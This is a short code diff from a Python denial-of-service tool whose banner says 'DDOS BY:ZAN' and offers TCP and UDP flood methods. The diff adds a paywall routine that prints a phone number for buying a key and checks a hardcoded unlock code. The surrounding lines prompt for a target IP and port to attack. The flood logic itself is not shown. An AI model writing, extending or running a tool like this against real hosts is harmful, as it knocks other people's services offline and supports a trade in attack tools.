@@ -314,6 +314,18 @@ print(""" | DDOS |  METHOD  | | DDOS BY:ZAN |
               |   TCP    |      UDP:17091    |
               |   UDP    |
               """)
+def kok():
+ print("Buy Key? chat:085871151230")
+ mopon = str(input("code >= "))
+ if mopon == "lifetime20":
+    unlock = 2
+ else:
+    unlock = 1
+ if unlock == 1:
+    print("ORDER DEK")
+ if unlock == 2:
+    print("VĪP DÉTÉÇT")
+kok()
 ip = str(input("IP ATTACK>="))
 ip = socket.gethostbyname(ip)
 port = int(input("PORT >= "))
